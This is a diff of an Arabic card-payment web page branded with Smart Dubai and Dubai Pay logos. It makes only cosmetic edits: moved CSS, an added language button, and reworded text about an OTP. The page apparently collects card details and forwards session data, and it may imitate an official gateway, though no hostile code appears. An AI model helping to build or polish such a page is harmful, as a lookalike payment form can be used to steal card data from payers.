@@ -50,6 +50,15 @@
             object-fit: contain;
         }
 
+        .lang-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 0;
+        }
+
         .content {
             flex: 1;
             padding: 20px;
@@ -157,6 +166,17 @@
             object-fit: contain;
         }
 
+        .legal-text {
+            font-size: 13px;
+            color: #ef4444;
+            text-align: center;
+            margin: 15px 0;
+            line-height: 1.5;
+            padding: 10px;
+            background: #fff5f5;
+            border-radius: 6px;
+        }
+
         .total-amount {
             text-align: center;
             padding: 16px;
@@ -204,17 +224,6 @@
             color: white;
         }
 
-        .legal-text {
-            font-size: 13px;
-            color: #ef4444;
-            text-align: center;
-            margin: 15px 0;
-            line-height: 1.5;
-            padding: 10px;
-            background: #fff5f5;
-            border-radius: 6px;
-        }
-
         .footer {
             background: white;
             border-top: 1px solid #e0e0e0;
@@ -248,6 +257,7 @@
                 <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
                 <img src="/dubaipay.png" alt="Dubai Pay" class="header-logo">
             </div>
+            <button class="lang-btn" onclick="window.location.href='payment.html'">English</button>
         </div>
 
         <!-- Main Content -->
@@ -281,7 +291,7 @@
 
                 <div class="form-group">
                     <label for="cardName">اسم صاحب البطاقة</label>
-                    <input type="text" id="cardName" placeholder="أدخل الاسم الكامل (كما هو موضح على البطاقة)" required>
+                    <input type="text" id="cardName" placeholder="أدخل الاسم الكامل كما هو موضح على البطاقة" required>
                 </div>
 
                 <div class="form-group">
@@ -343,7 +353,7 @@
 
             <!-- Legal Text -->
             <div class="legal-text">
-                لن يتم خصم منك أي رسوم إلا بعد الموافقة على طلبك من قبل مؤسسة فزعة. سيتم إرسال رمز التحقق OTP إلى هاتفك المسجل لتأكيد العملية.
+                لن يتم خصم أي رسوم إلا بعد الموافقة على طلبك من قبل مؤسسة فزعة. سيتم إرسال رمز التحقق OTP إلى هاتفك المسجل لتأكيد العملية.
             </div>
 
             <!-- Total Amount -->
@@ -400,7 +410,6 @@
             this.disabled = true;
             this.innerText = 'جاري المعالجة...';
 
-            // Get user data from session storage (saved from index_ar.html)
             const userData = JSON.parse(sessionStorage.getItem('userData') || '{}');
             
             const payload = {
